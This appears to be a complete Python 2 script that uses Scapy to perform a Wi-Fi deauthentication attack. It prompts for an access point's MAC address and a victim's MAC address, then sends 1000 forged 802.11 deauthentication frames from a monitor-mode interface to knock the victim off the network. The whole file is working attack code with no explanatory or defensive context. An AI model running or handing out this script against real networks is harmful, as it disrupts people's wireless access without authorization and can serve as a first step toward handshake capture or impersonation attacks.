from scapy.all import *
import sys

interface = 'mon0'
BSSID = raw_input("Enter Mac of AP - ")
victim_mac = raw_input("Enter Mac of victim - ")
frame = RadioTap()/Dot11(addr1 = victim_mac,addr2=BSSID, addr3 = BSSID)/Dot11Deauth()
sendp(frame,iface=interface,count=1000,inter=.1)





